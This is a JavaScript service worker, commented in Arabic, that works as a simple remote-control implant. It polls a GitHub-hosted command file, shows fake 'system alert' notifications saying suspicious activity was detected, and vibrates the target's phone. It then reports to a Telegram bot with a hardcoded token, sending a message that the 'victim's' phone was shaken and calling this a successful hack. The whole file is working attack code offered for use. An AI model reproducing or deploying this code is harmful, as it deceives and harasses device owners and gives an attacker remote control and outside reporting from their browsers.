const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
const CMD_URL = 'https://raw.githubusercontent.com/mosbahimouataz7/no-ip-/main/server.json';

let chatId = "";
let lastCmdId = "";

self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(clients.claim()));

self.addEventListener('message', e => {
    if (e.data.type === 'INIT') {
        chatId = e.data.id;
        // فحص الأوامر كل 20 ثانية (توازن بين السرعة واستهلاك بطارية الهاتف)
        setInterval(pollCommands, 20000); 
    }
});

async function pollCommands() {
    if (!chatId) return;
    try {
        const res = await fetch(CMD_URL + '?v=' + Date.now());
        const cmd = await res.json();

        if (cmd.id !== lastCmdId) {
            lastCmdId = cmd.id;
            
            // تنفيذ الاهتزاز القوي للهاتف
            if (cmd.action === "VIBRATE") {
                // إظهار إشعار نظام أندرويد/iOS
                self.registration.showNotification("تنبيه من النظام", {
                    body: cmd.text || "تم اكتشاف نشاط مشبوه!",
                    vibrate: [500, 200, 500, 200, 500], // اهتزاز طويل للهاتف
                    tag: "alert-vibrate",
                    renotify: true
                });
                
                // إبلاغك بنجاح الاختراق
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=📳 تم هز هاتف الضحية بنجاح!`);
            }
        }
    } catch(e) {}
}
